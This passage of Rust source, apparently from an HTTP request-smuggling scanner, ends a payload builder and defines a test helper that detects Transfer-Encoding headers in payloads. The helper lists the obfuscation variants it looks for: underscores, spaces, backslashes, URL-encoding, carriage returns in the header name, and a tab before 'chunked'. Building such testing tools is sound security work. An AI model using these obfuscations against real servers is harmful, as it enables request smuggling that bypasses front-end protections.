        method, path, host, custom_header_str, cookie_str, host
    ));

    payloads
}

/// Helper function to check if a payload contains a Transfer-Encoding related header
/// This handles various obfuscation techniques including control characters in header names
/// Note: This is only used in tests to verify payload generation, not in production code
pub fn contains_te_header_pattern(payload: &str) -> bool {
    let payload_lower = payload.to_lowercase();

    // Standard patterns (most reliable)
    if payload_lower.contains("transfer-encoding") ||
       payload_lower.contains("transfer_encoding") ||  // underjoin pattern
       payload_lower.contains("transfer encoding") ||  // spacejoin pattern
       payload_lower.contains("transfer\\encoding") || // backslash pattern
       payload_lower.contains("content-encoding")
    {
        // Content-Encoding confusion
        return true;
    }

    // URL-encoded patterns
    if payload_lower.contains("transfer%") || payload_lower.contains("=?") {
        return true;
    }

    // Partial patterns for control character obfuscation
    // These catch cases where control chars (CR, null, etc.) are inserted into header names
    if payload_lower.contains("nsfer-encoding") || // Handles CR in "Tra\rnsfer-Encoding"
       payload_lower.contains("encoding: chunked") ||
       payload_lower.contains("encoding:chunked") ||
       payload_lower.contains("encoding:\tchunked")
    {
        return true;
    }

    // Check for "chunked" value which should appear in all TE headers
    if payload_lower.contains("chunked") {
        // Also verify there's some encoding-related text nearby
        if payload_lower.contains("encoding")
            || payload_lower.contains("encod")
            || payload_lower.contains("transf")
        {
            return true;
        }
    }

    false
}
